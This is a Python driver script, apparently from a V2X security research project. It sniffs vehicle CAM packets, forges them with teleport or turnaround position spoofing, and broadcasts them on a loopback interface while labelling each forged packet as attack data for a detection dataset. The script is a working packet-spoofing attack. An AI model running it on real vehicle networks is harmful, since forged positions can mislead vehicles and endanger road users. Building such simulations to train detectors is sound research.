from workers.sniffer import CAMSniffer
from workers.spoofer import CAMSpoofer, ATTACK_TYPES
from workers.packet_launcher import CAMlauncher
import argparse
import json
import os
import sys
import time
from pathlib import Path

# Ensure repo root is on path so we can import app.modules
sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
try:
    from app.modules.telemetry_client import StationTelemetryPublisher
except Exception:
    StationTelemetryPublisher = None
try:
    from app.modules.DataCollector import DataCollector
except Exception:
    DataCollector = None
    print("⚠️WARNING: Data Collector is NONE")


def _attack_events_path() -> Path:
    env_path = os.getenv("ATTACK_EVENTS_PATH", "").strip()
    if env_path:
        return Path(env_path)
    return Path(__file__).resolve().parent.parent / "app" / "changepoint_detection" / "attack_events.jsonl"


def _append_attack_event(spoofer: CAMSpoofer, attack_type: ATTACK_TYPES, source_mac: str) -> None:
    event_path = _attack_events_path()
    event_path.parent.mkdir(parents=True, exist_ok=True)
    record = {
        "ts_ms": int(time.time() * 1000),
        "station_id": spoofer.id,
        "source_mac": source_mac,
        "attack_type": attack_type.name.lower(),
        "teleport_lat": None if spoofer.lat is None else spoofer.lat / 10_000_000.0,
        "teleport_lon": None if spoofer.lon is None else spoofer.lon / 10_000_000.0,
        "role": "attacker",
    }
    with open(event_path, "a", encoding="utf-8") as handle:
        handle.write(json.dumps(record) + "\n")

def run(interface : str, count : int, att_type : int, telemetry_publisher=None):
    sniffer = CAMSniffer(interface, count)
    sniffer.start()
    selected_attack = ATTACK_TYPES(att_type)
    
    # Initialize DataCollector to log forged packets to root-level csv
    collector = None
    if DataCollector is not None:
        try:
            collector = DataCollector()
        except Exception as e:
            print(f"Warning: Could not initialize DataCollector: {e}")
    
    for mac, payload in sniffer.get_discovered_stations().items():
        print(f"Station with MAC {mac} has payload: {payload}")
        spoofer = CAMSpoofer(mac, payload, attack_type=selected_attack)
        spoofer.run()
        spoofed_payload = spoofer.get_modified_payload()

        # Launching packet
        launcher = CAMlauncher(
            payload=spoofed_payload,
            mac=mac,
            dst='ff:ff:ff:ff:ff:ff',  # Broadcast destination
            interface='lo'
        )

        # Show frame info
        info = launcher.get_frame_info()
        print("Packet Information:")
        for key, value in info.items():
            print(f"   {key}: {value}")
        launcher.launch(count=1)
        _append_attack_event(spoofer, selected_attack, mac)
        
        # Log the forged packet to cam_trace.csv with label=1
        if collector is not None and spoofer.id is not None:
            try:
                lat = spoofer.lat / 10_000_000.0 if spoofer.lat is not None else 0.0
                lon = spoofer.lon / 10_000_000.0 if spoofer.lon is not None else 0.0
                speed_mps = (spoofer.speed / 100.0) if spoofer.speed is not None else 0.0
                heading_deg = (spoofer.heading * 0.1) if spoofer.heading is not None else 0.0
                
                collector.log_cam(
                    station_id=spoofer.id,
                    lat=lat,
                    lon=lon,
                    speed=speed_mps,
                    heading=heading_deg,
                    station_rd=str(spoofer.id),
                    label=1,  # Mark forged packets as attacked
                    ts_ms=int(time.time() * 1000),
                )
                print(f"   ✅ Logged forged packet for station {spoofer.id} to cam_trace.csv with label=1")
            except Exception as e:
                print(f"   ⚠️  Warning: Could not log forged packet: {e}")
        
        # Publish telemetry snapshot for this spoofed station if configured
        if telemetry_publisher is not None and spoofer.lat is not None and spoofer.lon is not None:
            try:
                lat = spoofer.lat / 10_000_000.0
                lon = spoofer.lon / 10_000_000.0
                id = spoofer.id
            except Exception:
                lat, lon, id = None, None, None

            if lat is not None and lon is not None:
                telemetry_publisher.publish_snapshot(
                    station_id=id,
                    lat=lat,
                    lon=lon,
                    speed_mps=0.0,
                    heading_deg=(spoofer.heading or 0.0),
                    station_type="attacked",
                    role="attacker",
                )
        
        
def main():
    parser = argparse.ArgumentParser(
        description="Launch a cluster of V2X stations for GeoNetworking simulation"
    )
    parser.add_argument(
        "--interface",
        "-s",
        type=str,
        default="lo",
        help="Interface to sniff on (default: Loopback)"
    )
    parser.add_argument(
        "--count",
        "-n",
        type=int,
        default=1,
        help="Number of packets to sniff (default: 1)"
    )
    parser.add_argument(
        "--attack-type",
        "-a",
        type=int,
        default=ATTACK_TYPES.TELEPORT.value,
        help="ATTACK TYPES (TELEPORT - 1, TURNAROUND - 2) (default: 1)"
    )
    parser.add_argument(
        "--telemetry-url",
        type=str,
        default="",
        help="Optional telemetry endpoint, e.g. http://127.0.0.1:8000/api/telemetry"
    )

    args = parser.parse_args()

    # If telemetry URL provided, set env var for other modules and construct publisher
    if args.telemetry_url:
        os.environ["STATION_TELEMETRY_URL"] = args.telemetry_url.strip()

    telemetry_publisher = None
    if StationTelemetryPublisher is not None:
        telemetry_publisher = StationTelemetryPublisher.from_env()

    run(args.interface, args.count, args.attack_type, telemetry_publisher=telemetry_publisher)


if __name__ == '__main__':
    main()
    